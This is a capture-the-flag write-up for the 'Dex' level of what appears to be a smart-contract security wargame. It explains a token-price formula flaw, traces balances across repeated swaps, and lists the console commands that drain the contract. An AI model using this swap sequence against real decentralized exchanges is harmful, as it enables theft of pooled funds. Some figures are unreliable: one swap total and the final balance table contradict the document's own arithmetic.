LEVEL 22: Dex

Vulnerability - Poor Token Price Mechanism
- The swap price per token is calculated with this algorithm:

	(amount * this contract's balance of token swapped to) / (this contract's balance of token swapped from)

	- Therefore if the contract's balance of some token were to be drained to 0,
		there would be a math error
	- Furthermore, this leads to an arbitrage opportunity where if an attack
		continuously transfers their entire balance of each token, the price of
		the contract will grant the user increasingly more token in return
	- Inspect the following sceneario:

		Starting sceneario
		------------------------------------
		Player balance of token1 										: 10
		Player balance of token2 										: 10
		Contract balance of token1 									: 100
		Contract balance of token2 									: 100
		Price of player swapping token1 for token2 	: (10 * 100) / (100) = 10
		Sum tokens player can get from swap 				: 20
		Price of player swapping token2 for token1 	: (10 * 100) / (100) = 10
		Sum tokens player can get from swap 				: 20

		Player transfers all of token1
		------------------------------------
		Player balance of token1 										: 0
		Player balance of token2 										: 20
		Contract balance of token1 									: 110
		Contract balance of token2 									: 90
		Price of player swapping token1 for token2 	: (0 * 90) / (110) = 0
		Sum tokens player can get from swap 				: 0
		Price of player swapping token2 for token1 	: (20 * 110) / (90) = 24.4444
		Sum tokens player can get from swap 				: 24

		- Look! here we found a trade where the player gains an additional 4
			tokens!

		Player transfers all of token2
		------------------------------------
		Player balance of token1 										: 24
		Player balance of token2 										: 0
		Contract balance of token1 									: 86
		Contract balance of token2 									: 110
		Price of player swapping token1 for token2 	: (24 * 110) / (86) = 30.6976...
		Sum tokens player can get from swap 				: 30
		Price of player swapping token2 for token1 	: (0 * 86) / (110) = 0
		Sum tokens player can get from swap 				: 0

		- If we keep repeating this process, we can get more and more total
			tokens... what if we repeat this process a couple more times?

		Player transfers all of token1
		------------------------------------
		Player balance of token1 										: 0
		Player balance of token2 										: 30
		Contract balance of token1 									: 110
		Contract balance of token2 									: 80
		Price of player swapping token2 for token1 	: (30 * 110) / (80) = 41.25
		Sum tokens player can get from swap 				: 41

		Player transfers all of token2
		------------------------------------
		Player balance of token1 										: 41
		Player balance of token2 										: 0
		Contract balance of token1 									: 69
		Contract balance of token2 									: 110
		Price of player swapping token1 for token2 	: (41 * 110) / (69) = 65.36
		Sum tokens player can get from swap 				: 41

		Player transfers all of token1
		------------------------------------
		Player balance of token1 										: 0
		Player balance of token2 										: 65
		Contract balance of token1 									: 110
		Contract balance of token2 									: 45
		Price of player swapping token2 for token1 	: (65 * 110) / (45) = 158.8888
		Sum tokens player can get from swap 				: More than the contract can supply?

		- Note, at this point, a full swap is impossible as the contract can't
			supply a trade, however, we can still drain all of its funds... >:^)

		Player transfers 45 of token2
		------------------------------------
		Player balance of token1 										: 110
		Player balance of token2 										: 20
		Contract balance of token1 									: 90
		Contract balance of token2 									: 0

		- And with this, we can successfully drain the contract of all of token2
			causing us to get rich!

Exploitation
 - The exploitation phase is merely just repeating trades until the contract
	 is drained, for your convience I've added them here :)

		// First we need to approve the dex to make any transactions
		await contract.approve(instance, 100000)
		// Then we can start making swaps
		await contract.swap(await contract.token2(), await contract.token1(),10)
		await contract.swap(await contract.token1(), await contract.token2(),20)
		await contract.swap(await contract.token2(), await contract.token1(),24)
		await contract.swap(await contract.token1(), await contract.token2(),30)
		await contract.swap(await contract.token2(), await contract.token1(),41)
		await contract.swap(await contract.token1(), await contract.token2(),45)

		- Now submit your instance :)
